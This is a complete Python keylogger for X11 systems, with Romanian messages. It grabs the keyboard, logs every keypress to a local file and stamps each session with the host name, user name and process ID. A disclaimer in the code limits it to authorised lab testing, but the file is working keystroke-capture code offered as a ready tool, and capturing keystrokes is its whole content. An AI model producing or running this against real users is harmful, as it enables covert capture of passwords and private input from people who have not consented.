from Xlib import display, X
import time
import os
from datetime import datetime

class KeyloggerX11:
    def __init__(self, log_file="keylog.txt"):
        self.log_file = log_file
        self.disp = display.Display()
        self.screen = self.disp.screen()
        self.root = self.screen.root
        self.running = True
        self._write_header()

    def _write(self, text):
        with open(self.log_file, 'a') as f:
            f.write(text)
            f.flush()

    def _write_header(self):
        self._write(f"\n=== KEYLOG SESSION ===\nStart: {datetime.now().isoformat()}\nHost: {os.uname().nodename}\nUser: {os.getenv('USER', 'unknown')}\nPID: {os.getpid()}\n=====================\n")

    def _write_footer(self):
        self._write(f"End: {datetime.now().isoformat()}\n=====================\n")

    def start(self):
        print(f"🔍 X11 Keylogger pornit. Log: {self.log_file}")
        print("⏹️  Apasă ESC pentru a opri.")
        
        self.root.grab_keyboard(True, X.GrabModeAsync, X.GrabModeAsync, X.CurrentTime)
        
        while self.running:
            try:
                event = self.disp.next_event()
                if event.type == X.KeyPress:
                    keycode = event.detail
                    keysym = self.disp.keycode_to_keysym(keycode, 0)
                    if keysym == 0xFF1B:  # ESC
                        self.running = False
                    else:
                        key = self.disp.keysym_to_string(keysym)
                        if key:
                            self._write(key)
            except KeyboardInterrupt:
                self.running = False
                break
            except:
                pass
        
        self.root.ungrab_keyboard(X.CurrentTime)
        self._write_footer()
        print(f"✅ Keylogger oprit. Log salvat în {self.log_file}")

if __name__ == "__main__":
    print("⚠️  ACEST TOOL ESTE PENTRU TESTARE ÎN MEDIU CONTROLAT.")
    print("⚠️  NU UTILIZAȚI ÎN AFARA UNUI LABORATOR AUTORIZAT.")
    print("=" * 60)
    KeyloggerX11().start()
